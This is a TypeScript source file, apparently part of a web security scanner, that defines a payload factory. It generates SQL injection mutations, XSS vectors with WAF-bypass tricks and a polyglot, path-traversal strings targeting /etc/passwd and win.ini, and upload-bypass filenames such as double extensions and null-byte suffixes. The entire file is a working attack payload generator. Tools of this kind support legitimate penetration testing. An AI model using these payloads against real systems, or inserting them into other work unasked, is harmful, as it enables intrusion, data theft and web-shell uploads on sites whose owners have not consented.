export type PayloadContext = 'query_param' | 'json_string' | 'xml_attr' | 'header' | 'filename' | 'mimetype';

export interface PayloadGenerator {
    generate(basePayload: string, context: PayloadContext): string[];
}

class SqlPayloadGenerator implements PayloadGenerator {
    generate(base: string, context: PayloadContext): string[] {
        const payloads = [base];

        // 1. Basic Encoding Mutations
        payloads.push(encodeURIComponent(base)); // URL Encoded
        payloads.push(encodeURIComponent(encodeURIComponent(base))); // Double URL Encoded

        // 2. SQL Specific Mutations (Comment variations)
        if (base.includes('--')) {
            payloads.push(base.replace('--', '#')); // MySQL/Postgres hash comment
            payloads.push(base.replace('--', '/*')); // C-style comment start
        }

        // 3. Logic Variations (OR vs AND, 1=1 vs 2=2)
        if (base.includes('OR 1=1')) {
            payloads.push(base.replace('OR 1=1', 'OR 2=2'));
            payloads.push(base.replace('OR 1=1', 'OR "a"="a"'));
            payloads.push(base.replace('OR 1=1', '|| 1=1')); // Concatenation style logic
        }

        // 4. Context-Aware Wrappers
        if (context === 'json_string') {
            // Break out of JSON string context if injected into value
            payloads.push(`" ${base} --`);
            payloads.push(`" ${base} , "ignore": "`);
        }

        return payloads;
    }
}

class XssPayloadGenerator implements PayloadGenerator {
    generate(base: string, context: PayloadContext): string[] {
        const payloads = [base];

        // 1. Encoding
        payloads.push(encodeURIComponent(base));

        // 2. Tag Case Variation (WAF bypass)
        // <script> -> <ScRiPt>
        const mixedCase = base.replace(/script/gi, (match) => {
            return match.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('');
        });
        if (mixedCase !== base) payloads.push(mixedCase);

        // 3. Image Error Vectors (often less filtered than script)
        if (base.includes('<script>')) {
            payloads.push('<img src=x onerror=alert(1)>');
            payloads.push('<svg/onload=alert(1)>');
            payloads.push('<body onload=alert(1)>');
        }

        // 4. Polyglots (break out of multiple contexts)
        payloads.push('javascript://%250Aalert(1)//"\'></title></textarea>--!><img src=x onerror=alert(1)>');

        return payloads;
    }
}

class LfiPayloadGenerator implements PayloadGenerator {
    generate(base: string, context: PayloadContext): string[] {
        return [
            '../../../../etc/passwd',
            '../../../../windows/win.ini',
            '..%2f..%2f..%2fetc%2fpasswd', // URL Encoded
            '....//....//....//etc//passwd', // Bypass filters stripping ../
            '/etc/passwd',
            'C:\\Windows\\win.ini'
        ];
    }
}

class FileUploadPayloadGenerator implements PayloadGenerator {
    generate(base: string, context: PayloadContext): string[] {
        const payloads: string[] = [base];

        if (context === 'filename') {
            // Extensions
            const dangerousExts = ['.php', '.jsp', '.asp', '.aspx', '.exe', '.sh', '.html', '.svg'];
            const name = base.split('.')[0] || 'shell';

            // 1. Simple extensions
            dangerousExts.forEach(ext => payloads.push(`${name}${ext}`));

            // 2. Double extensions
            dangerousExts.forEach(ext => payloads.push(`${name}${ext}.jpg`));
            dangerousExts.forEach(ext => payloads.push(`${name}${ext}.png`));

            // 3. Null byte bypass
            dangerousExts.forEach(ext => payloads.push(`${name}${ext}%00.jpg`));

            // 4. Case variation
            payloads.push(`${name}.pHP`);
            payloads.push(`${name}.pHp`);
        } else if (context === 'mimetype') {
            // MIME Types
            payloads.push('image/jpeg');
            payloads.push('image/png');
            payloads.push('application/pdf');
            payloads.push('text/plain');
            payloads.push('application/octet-stream');
        }

        return payloads;
    }
}

class PayloadFactoryService {
    private sqlGenerator = new SqlPayloadGenerator();
    private xssGenerator = new XssPayloadGenerator();
    private lfiGenerator = new LfiPayloadGenerator();
    private fileUploadGenerator = new FileUploadPayloadGenerator();

    getPayloads(type: 'sqli' | 'xss' | 'lfi' | 'file_upload' | 'generic', base: string, context: PayloadContext = 'query_param'): string[] {
        switch (type) {
            case 'sqli': return this.sqlGenerator.generate(base, context);
            case 'xss': return this.xssGenerator.generate(base, context);
            case 'lfi': return this.lfiGenerator.generate(base, context);
            case 'file_upload': return this.fileUploadGenerator.generate(base, context);
            default: return [base, encodeURIComponent(base)];
        }
    }
}

export const PayloadFactory = new PayloadFactoryService();
